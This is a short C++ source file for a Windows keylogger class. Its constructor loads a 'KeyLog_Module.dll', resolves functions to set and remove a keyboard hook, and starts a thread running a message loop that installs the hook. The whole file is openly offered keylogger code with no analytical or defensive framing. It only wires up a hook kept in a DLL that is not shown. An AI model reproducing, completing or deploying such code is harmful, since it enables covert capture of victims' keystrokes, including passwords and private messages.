#include "keylogger.h"

SetHook Keylogger::SetKeyBoardHook = NULL;

Keylogger::Keylogger()
{
	keylog_dll = LoadLibraryA("KeyLog_Module.dll");
	SetKeyBoardHook = (SetHook)GetProcAddress(keylog_dll, "SetKeyBoardHook");
	RemoveKeyBoardHook = (RemoveHook)GetProcAddress(keylog_dll, "RemoveKeyBoardHook");
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Keylogger::keylog_loop, NULL, NULL, NULL);
}

Keylogger::~Keylogger()
{
	RemoveKeyBoardHook();
	CloseHandle(keylog_dll);
}

void Keylogger::keylog_loop()
{
	SetKeyBoardHook();
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) != 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}